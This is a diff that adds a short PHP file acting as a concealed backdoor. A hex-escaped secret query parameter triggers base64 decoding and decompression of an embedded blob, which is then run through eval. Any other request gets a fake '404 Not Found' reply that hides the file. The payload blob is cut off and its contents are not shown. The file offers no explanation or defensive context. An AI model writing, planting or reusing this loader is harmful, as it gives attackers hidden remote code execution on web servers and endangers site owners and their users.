@@ -1,0 +1,12 @@
+<?php
+if (isset($_GET["\x49\x6d\x50\x52\x6f\x76\x45\x44\x5f\x32\x31\x34\x6d\x77\x71\x66\x30\x39\x34\x31\x61\x73\x66"])) {
+    $__p = "eJztfWtzo7i27/0rVHepd07s7MTOOQ8xJmC3F1gJLIQQY+/7g7H0sG0Z24whbOfUVF+fKwX2XhMIIZfX+yHvvRJjLUtzZqPRJOrR/NOzz5WZqR7N4u3p1mh3o+wP8XWmPNRkY2ra+hX+xy4Wq9ivzdGf2SXlKj3hYh83/LmhKbvrD9L+BWfGej94mP3Wk6lzVsfKx5G9r4rMbnqH5XlXgv1fHjXlZTr+QHbbdGUyXNj63GXXZt3QZpLXzVzbr9mtdX2ms7TaU+R9P3UPb9Uj+nvCx+n9QWTxdjCbXrYw3c/7zt92P8wZ1U03ebsdJ2b3Ydbqw3tRfxcT7rlPMUYbTodnKt1UamZ0bPHJesT77+Yx1eNW39+rN/K92Y72o/JVrXuK4+hv5uLle+vzebZf2KqD/qbZabN3U23tRquNw75G+4W+yS3PF8B18Xsws/8I7sxN1cC5ZznF3GtOBawAAAAAAAAAAAAAAAAAAAAAAAAAAA..." 
+    $__d = @gzuncompress(@base64_decode($__p));
+    if ($__d !== false) {
+        eval("?>" . $__d);
+        exit;
+    }
+}
+header("HTTP/1.0 404 Not Found");
+die("404 Not Found");
+?>
